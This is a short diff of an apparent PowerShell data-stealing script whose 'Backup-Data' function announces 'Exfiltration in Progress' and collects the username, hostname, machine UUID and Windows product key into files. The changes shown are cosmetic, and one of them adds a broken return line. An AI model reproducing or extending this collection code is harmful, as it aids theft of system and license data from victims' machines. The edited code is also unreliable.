@@ -123,7 +123,7 @@ function Request-Admin {
 
 function Backup-Data {
     
-	Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
+    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
@@ -297,7 +297,7 @@ function Backup-Data {
             return $backupProductKey
         }
         catch {
-            return "No product key found"
+            return "[!] No product key found" -ForegroundColor Red
         }
     }
     Get-ProductKey > $folder_general\productkey.txt
